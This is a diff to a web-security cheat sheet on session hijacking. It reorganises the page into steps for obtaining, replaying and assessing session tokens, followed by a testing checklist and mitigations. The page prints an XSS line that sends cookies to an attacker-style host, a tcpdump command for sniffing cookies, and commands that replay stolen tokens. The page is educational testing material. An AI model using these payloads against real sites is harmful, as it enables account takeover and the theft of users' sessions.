@@ -9,43 +9,64 @@ Session Hijacking is stealing or predicting a valid session token and using it t
 - **Predictable IDs** - sequential or low-entropy tokens can be guessed
 - **Leakage** - tokens in URLs, logs, referrers, or error pages
 
-## Test payloads
+## Step 1 - Obtain a token
 
 ```javascript
-// XSS payload to exfiltrate a readable cookie
+// Via XSS (only if the cookie is NOT HttpOnly)
 new Image().src = 'https://attacker.oastify.com/?c=' + document.cookie;
-
-// Use a captured token from any client
-// (browser console or curl)
 ```
 
 ```bash
-# Replay a stolen session with curl
-curl https://target.tld/account \
-  -H "Cookie: SESSIONID=stolen_value_here"
+# Via network sniffing (plaintext HTTP or stripped TLS)
+tcpdump -A -i eth0 'tcp port 80' | grep -i "cookie:"
 ```
+
+Other sources: tokens in URLs (leak via `Referer`), server logs, browser history, predictable/low-entropy IDs.
+
+## Step 2 - Replay the token
+
+```bash
+# curl - just set the stolen cookie
+curl https://target.tld/account -H "Cookie: SESSIONID=stolen_value_here"
+```
+
+```javascript
+// Or set it in a browser console / EditThisCookie, then refresh
+document.cookie = "SESSIONID=stolen_value_here; path=/";
+```
+
+If the account page loads as the victim, hijack successful.
+
+## Step 3 - Assess token quality (predictability)
+
+Feed many freshly issued tokens into **Burp Sequencer** to measure entropy. Sequential (`1001`, `1002`) or low-entropy tokens can be guessed/brute-forced instead of stolen.
 
 ## Tools
 
 - [Burp Suite Sequencer](https://portswigger.net/burp) - measure token randomness/entropy
 - [Wireshark](https://www.wireshark.org/) - spot tokens sent in the clear
 - [mitmproxy](https://mitmproxy.org/) - intercept and replay sessions
+- [Cookie-Editor / EditThisCookie](https://cookie-editor.com/) - inject a token into your browser
 
-## Manual testing
+## Manual testing checklist
 
-1. Grab a valid session token from your own login
-2. Replay it from a different browser/IP - does it still work?
-3. Check whether the token is `HttpOnly`, `Secure`, and rotated after login
-4. Feed many tokens into Burp Sequencer to check for predictability
-5. Hunt for tokens leaking in URLs, logs, or third-party requests
+1. Grab a valid token from your own login; replay from another browser/IP - still works?
+2. Confirm cookie flags: `HttpOnly`, `Secure`, `SameSite`.
+3. Is the token rotated after login and invalidated on logout (server-side)?
+4. Check entropy in Sequencer.
+5. Hunt for tokens leaking in URLs, logs, or third-party requests.
 
-## Mitigation
+## Mitigation - the fix
 
-- Cookies must be `HttpOnly`, `Secure`, and `SameSite`
-- Serve everything over HTTPS with HSTS
-- Generate high-entropy, unpredictable tokens
-- Rotate on login, expire on idle, and bind sessions to context
-- Provide server-side logout that truly invalidates the token
+- Cookies: `HttpOnly` (blocks JS theft), `Secure` (HTTPS only), `SameSite`.
+- Serve everything over HTTPS with **HSTS**.
+- Generate **high-entropy** (128+ bit) unpredictable tokens from a CSPRNG.
+- Rotate on login, expire on idle + absolute timeout, and **truly invalidate** on logout server-side.
+- Optionally bind sessions to context (User-Agent/IP) with care.
+
+## Practice
+
+- PortSwigger authentication labs; OWASP Juice Shop
 
 ## Deep dive
 
